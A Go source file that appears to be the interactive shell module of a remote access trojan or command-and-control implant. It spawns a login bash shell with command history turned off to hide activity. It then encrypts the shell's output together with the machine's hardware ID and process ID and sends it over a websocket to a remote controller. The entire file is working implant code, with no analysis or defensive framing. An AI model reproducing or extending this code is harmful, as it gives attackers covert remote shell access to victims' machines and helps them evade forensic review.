package ptyopt

import (
	"io"
	"main/Encrypt"
	"main/Helper"
	"main/MessagePack"
	"main/PcInfo"
	"os"
	"os/exec"

	"github.com/creack/pty"
	"github.com/togettoyou/wsc"
)

type PtyData struct {
	Stdin  io.WriteCloser
	Stdout io.ReadCloser
}

func InitPtmx() *os.File {
	ws, _ := pty.GetsizeFull(os.Stdin)
	c := exec.Command("/bin/sh", "-c", "exec bash --login")
	c.Env = []string{"HISTFILE=/dev/null"}
	ptmx, err := pty.Start(c)

	if err != nil {
		return nil
	}
	_ = pty.Setsize(ptmx, ws)
	return ptmx
}
func SendData(data []byte, Connection *wsc.Wsc) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	Connection.SendBinaryMessage(endata)
}
func RetPtyResult(resBuffer []byte, ProcessPath string, unmsgpack MessagePack.MsgPack, Connection *wsc.Wsc) {

	utf8Stdout, err := Helper.ConvertGBKToUTF8(string(resBuffer))
	if err != nil {
		//Log(err.Error(), Connection, *unmsgpack)
		utf8Stdout = err.Error()
	}
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("shell")
	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("ReadInput").SetAsString(ProcessPath + "\\>" + unmsgpack.ForcePathObject("WriteInput").GetAsString() + "\n" + utf8Stdout)
	SendData(msgpack.Encode2Bytes(), Connection)
}
